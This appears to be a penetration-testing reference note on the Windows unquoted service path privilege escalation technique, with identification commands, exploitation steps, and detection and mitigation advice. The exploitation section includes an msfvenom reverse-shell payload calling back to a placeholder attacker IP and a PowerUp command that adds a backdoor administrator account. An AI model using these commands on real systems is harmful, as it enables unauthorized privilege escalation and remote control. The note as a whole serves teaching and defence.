---
tags:
  - "#type/technique"
  - "#tactic/TA0004"
  - "#technique/T1574.009"
  - "#stage/privilege-escalation"
  - "#os/windows"
  - "#tool/powerup"
  - "#tool/accesschk"
aliases:
  - Unquoted Service Path
  - Binary Planting
  - Path Interception
---

## Technique
___

The Unquoted Service Path vulnerability occurs when a Windows service is configured with a path that:
1. Contains spaces in the path
2. Is not enclosed in quotation marks

When Windows attempts to locate and execute the service binary, it will first try to interpret each space as a delimiter between the program name and its arguments. This creates an opportunity for an attacker to place a malicious executable in one of the intermediate directories, which Windows will execute with the privileges of the vulnerable service (often SYSTEM).

For example, if a service has a path set to:
```
C:\Program Files\My Service\service.exe
```

Windows will attempt to execute files in the following order:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Service\service.exe`

If an attacker can write to any of the earlier directories, they can place a malicious executable that Windows will run with the service's privileges when the service starts.

## Prerequisites
___

**Access Level:** Local user account with write permissions to at least one of the intermediate directories in the service path.

**System State:** 
- A Windows service with an unquoted path containing spaces
- The ability to restart the service or wait for a system reboot

## Identification
___

### Using WMIC

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

This command:
- Lists all services
- Filters for services that start automatically
- Excludes services in the Windows directory (which are typically secure)
- Excludes services with quoted paths

### Using PowerShell

```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*"' -and $_.PathName -like '* *'} | Select-Object Name, PathName, StartMode
```

### Using PowerUp (PowerSploit)

```powershell
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

### Using sc Command

Check a specific service:
```cmd
sc qc "Service Name"
```

Look for `BINARY_PATH_NAME` that contains spaces and isn't enclosed in quotes.

## Exploitation
___

### Exploitation Process

1. **Identify the vulnerable service and its path**:
   ```cmd
   sc qc "Vulnerable Service"
   ```

2. **Check write permissions on intermediate directories**:
   ```cmd
   icacls "C:\Program Files"
   icacls "C:\Program Files\My Service"
   ```

3. **Create a malicious executable**:
   ```cmd
   # Simple reverse shell payload
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe -o Program.exe
   ```

4. **Place the executable in the writable directory**:
   ```cmd
   copy Program.exe "C:\Program.exe"
   ```

5. **Restart the service or wait for system reboot**:
   ```cmd
   sc stop "Vulnerable Service"
   sc start "Vulnerable Service"
   ```

### Automated Exploitation with PowerUp

```powershell
Write-ServiceBinary -Name "Vulnerable Service" -Path "C:\Program.exe" -Command "net user hacker Password123! /add && net localgroup administrators hacker /add"
```

## Detection & Mitigation
___

### Detection

- Monitor for the creation of unexpected executables in root directories and program file paths
- Watch for service binary changes or modifications to service configurations
- Look for unusual processes spawned by services
- Monitor for changes to permissions on service directories

### Mitigation

1. **Properly quote service paths**:
   ```cmd
   sc config "Service Name" binpath= "\"C:\Program Files\My Service\service.exe\""
   ```

2. **Restrict write permissions on application directories**:
   ```cmd
   icacls "C:\Program Files" /deny Users:(W)
   icacls "C:\Program" /deny Users:(W)
   ```

3. **Use Windows Installer for service installation**, which properly quotes paths

4. **Implement application whitelisting** to prevent unauthorized executables from running

5. **Regularly audit services** for unquoted paths:
   ```powershell
   Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*"' -and $_.PathName -like '* *'} | Select-Object Name, PathName
   ```

6. **Place services in directories without spaces**, such as `C:\Services\MyService\service.exe` instead of paths with spaces

7. **Keep Windows updated** with the latest security patches